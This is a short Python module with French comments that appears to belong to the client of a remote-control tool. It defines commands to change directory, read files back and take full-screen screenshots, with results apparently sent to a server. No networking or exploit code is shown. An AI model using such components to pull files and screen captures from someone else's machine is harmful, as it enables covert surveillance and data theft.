# pour executer les commandes personalisees

import os
from PIL import ImageGrab


def cd(repertoire):     # changer de repertoire
    # on utilise os.chdir car subprocess.run() ne prend pas en compte la commande pour changer de dossier
    try:
        os.chdir(repertoire)
    except FileNotFoundError:
        return "Repertoire introuvable"
    else:
        return os.getcwd()


def dl(nom_de_fichier):     # pour telecharger un fichier
    try:
        fichier = open(nom_de_fichier, "rb")
    except FileNotFoundError:
        return "0"  # Fichier introuvable (on va le decoder sur le serveur car c'est un cas special)
    else:
        data = fichier.read()
        fichier.close()
        return data


def screenshot(nom_image):      # pour faire des capture d'ecran
    capture = ImageGrab.grab()  # capture d'ecran
    capture.save(nom_image)  # sauvegarde dans le repertoire courant
    return dl(nom_image)      # on telecharge l'image
